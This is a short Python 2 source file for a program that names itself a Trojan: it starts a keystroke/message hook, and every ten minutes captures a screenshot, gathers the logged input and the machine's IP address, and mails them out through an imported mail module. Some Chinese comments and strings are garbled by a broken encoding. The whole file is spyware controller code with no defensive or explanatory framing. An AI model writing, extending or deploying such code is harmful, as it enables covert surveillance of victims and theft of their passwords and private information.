# -*- coding: utf-8 -*-
import MyHook
import GetScrPic
import Mail
import thread
import time
import os
import GetIP

class Trojan:
	def __init__(self):
		self.hook = MyHook.RecordMessage()
		getIP = GetIP.Getmyip()
		self.ip = getIP.getip()

	def Record(self):
		self.hook.go()

	def Send(self):
		while True:
			scrPic = GetScrPic.ScrPic()
			picname = scrPic.Get('')
			info = self.hook.GetInfo()
			if info == '':
				info ="������"
				print info
				#info.encode('utf-8')

			Mail.send(self.ip,info,picname)
			#os.remove(picname)Ϊ�˼ӿ�ͼƬɾ�����ٶȽ��Ĵ��������mailģ����
			time.sleep(600)

	def go(self):
		
		thread.start_new_thread(self.Send,())
		self.Record()

def main():
	trojan = Trojan()
	trojan.go()
	
if __name__ == '__main__':
	main()